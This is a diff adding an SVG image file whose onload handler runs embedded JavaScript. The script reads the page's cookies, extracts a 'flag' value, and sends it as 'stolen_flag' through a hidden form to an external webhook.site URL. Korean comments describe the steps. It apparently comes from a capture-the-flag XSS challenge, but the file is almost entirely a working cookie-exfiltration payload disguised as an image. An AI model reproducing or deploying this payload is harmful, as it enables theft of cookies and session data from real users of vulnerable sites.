@@ -1,0 +1,31 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200" viewBox="0 0 200 200"
+     onload="submitWebhookForm();"> 
+    
+    <script type="text/javascript">
+      <![CDATA[
+      function submitWebhookForm() {
+          var cookies = document.cookie;
+          var flagValue = cookies.match(/flag=([^;]+)/);
+          flagValue = flagValue ? flagValue[1] : 'FLAG_NOT_FOUND';
+          
+          // 1. 숨겨진 폼 생성
+          var form = document.createElement('form');
+          form.setAttribute('method', 'GET');
+          form.setAttribute('action', 'https://webhook.site/c0f19732-67ad-4534-bf00-cfd34c46e83e');
+          form.setAttribute('target', '_blank'); // 현재 페이지 이동 방지
+          
+          // 2. FLAG 값을 담을 입력 필드 생성
+          var input = document.createElement('input');
+          input.setAttribute('type', 'hidden');
+          input.setAttribute('name', 'stolen_flag');
+          input.setAttribute('value', flagValue);
+          
+          // 3. 폼을 문서에 추가하고 제출
+          document.body.appendChild(form);
+          form.appendChild(input);
+          form.submit();
+      }
+      ]]>
+    </script>
+</svg>
